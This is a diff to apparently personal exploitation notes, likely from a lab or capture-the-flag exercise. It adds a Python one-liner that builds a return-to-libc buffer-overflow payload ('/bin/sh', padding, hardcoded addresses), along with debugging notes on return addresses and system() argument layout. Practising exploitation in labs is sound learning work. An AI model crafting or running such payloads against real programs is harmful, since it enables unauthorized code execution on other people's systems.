@@ -1,1 +1,9 @@
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa…
+python -c 'print "/bin/sh\x00" + 72*"a" + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\x4b\x85\x04\x08" + "\x08\xa0\x04\x08"' > /tmp/payload
+
+->/usr/bin/bash doesn't exist 
+-> use /bin/sh instead
+    ->/bin/bash  + 70*"a" doesn't work for no reason
+
+->use ret (0x0804844b) main, not leave (0x0804844a)
+
+->system() will wait for a return address before its argument, retype ret main works
